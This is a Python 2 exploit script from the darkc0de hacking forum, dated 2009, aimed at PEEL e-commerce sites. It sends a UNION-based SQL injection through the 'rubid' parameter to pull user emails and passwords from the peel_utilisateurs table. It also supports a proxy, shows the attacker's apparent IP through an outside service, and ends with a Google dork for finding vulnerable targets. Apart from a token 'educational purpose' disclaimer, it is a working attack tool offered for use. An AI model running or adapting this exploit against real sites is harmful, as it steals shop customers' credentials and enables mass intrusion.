#!/usr/bin/python
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# !!! Special thanx for d3hydr8,low1z and rsauron who inspired me !!! 
#
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# ---  d3hydr8 - low1z - rsauron - P47r1ck - r45c4l - bennu    # 
# ---  .QK  - Croathack - stefo                                #
# ---  Eliminator and to all members of darkc0de and ljuska.org#
################################################################ 
# 
#
#   Vuln discovered by banjirian
#
#
#
#


import os, sys, time, re, urllib2, httplib, socket

if sys.platform == 'linux' or sys.platform == 'linux2':
	clearing = 'clear'
else:
	clearing = 'cls'
os.system(clearing)

proxy = "None"
count = 0

if len(sys.argv) < 2 or len(sys.argv) > 4:
	print "\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   06/2009      PEEL e-commerce                                |"
	print "|            Vuln discovered by        banjirian                |"
	print "| Usage: peel.py http://www.site.com/                           |"
	print "| Visit www.darkc0de.com and www.ljuska.org                     |"
        print "|---------------------------------------------------------------|\n"
	sys.exit(1)
	
for arg in sys.argv:
	if arg == '-h':
		print "\n|-------------------------------------------------------------------------------|"
                print "| b4ltazar[@]gmail[dot]com                                                      |"
                print "|   06/2009      PEEL e-commerce                                                |"
		print "|            Vuln discovered by        banjirian                                |"
                print "| Usage: peel.py www.site.com                                                   |"
	        print "| Example: pell.py    http://www.acksoft.fr                                     |"
	        print "| Visit www.darkc0de.com and www.ljuska.org                                     |"
                print "|-------------------------------------------------------------------------------|\n"
		sys.exit(1)
	elif arg == '-p':
		proxy = sys.argv[count+1]
	count += 1

site = sys.argv[1]
if site[:4] != "http":
	site = "http://"+site
if site[-1] != "/":
	site = site + "/"
	
print "\n|---------------------------------------------------------------|"
print "| b4ltazar[@]gmail[dot]com                                      |"
print "|   06/2009      PEEL e-commerce                                |"
print "|            Vuln discovered by        banjirian                |"
print "| Visit www.darkc0de.com and www.ljuska.org                     |"
print "|---------------------------------------------------------------|\n"
print "\n[-] %s" % time.strftime("%X")
	
socket.setdefaulttimeout(20)
try:
	if proxy != "None":
		print "[+] Proxy:",proxy
		print "\n[+] Testing Proxy..."
		pr = httplib.HTTPConnection(proxy)
		pr.connect()
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
		proxyfier = urllib2.build_opener(proxy_handler)
		proxyfier.open("http://www.google.com")
		print
		print "\t[!] w00t!,w00t! Proxy: "+proxy+" Working"
		print
	else:
		print "[-] Proxy not given"
		print
		proxy_handler = urllib2.ProxyHandler()
except(socket.timeout):
		print
		print "\t[-] Proxy Timed Out"
		print
		sys.exit(1)
except(),msg:
		print msg
		print "\t[-] Proxy Failed"
		print
		sys.exit(1)
		
try:
	url = "http://antionline.com/tools-and-toys/ip-locate/index.php?address="
except(IndexError):
	print "[-] Wtf?"
proxyfier = urllib2.build_opener(proxy_handler)
proxy_check = proxyfier.open(url).readlines()
for line in proxy_check:
	if re.search("<br><br>", line):
		line = line.replace("</b>","").replace('<br>',"").replace('<b>',"")
		print "\n[!]",line,"\n"	
		
print "[+] Target:",site
print "[+] Exploiting...\n"

try:
	check = proxyfier.open(site+'lire/index.php?rubid=1+union+all+select+1,concat_ws(char(58),email,mot_passe,0x62616c74617a6172),3+from+peel_utilisateurs--').read()
	if re.findall("baltazar", check):
		print "[!] w00t!,w00t!: ",site+'lire/index.php?rubid=1+union+all+select+1,concat_ws(char(58),email,mot_passe),3+from+peel_utilisateurs--'
		print
	else:
		print "[-] Can't exploit :("
		print
		
except(urllib2.HTTPError):
		pass
except(KeyboardInterrupt, SystemExit):
		pass 
	
print "[!] Use this google dork for finding targets"
print "\tinurl:lire/index.php?rubid=\n"
print "\n[-] %s" % time.strftime("%X")




